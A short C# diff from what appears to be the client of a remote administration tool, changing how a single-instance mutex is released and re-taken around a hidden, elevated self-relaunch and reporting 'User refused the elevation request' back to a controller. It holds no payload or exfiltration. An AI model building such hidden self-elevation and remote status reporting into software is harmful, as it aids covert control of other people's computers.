@@ -17,7 +17,9 @@ namespace Client.Controllers
                     Arguments = "/k START \"\" \"" + ClientData.currentPath + "\" & EXIT",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = true
-                };           
+                };
+
+                MutexController.closeMutex();
 
                 try
                 {
@@ -26,7 +28,7 @@ namespace Client.Controllers
                 catch
                 {
                     new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
-                    //MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
+                    MutexController.createMutex();  // re-grab the mutex
                     return;
                 }
 
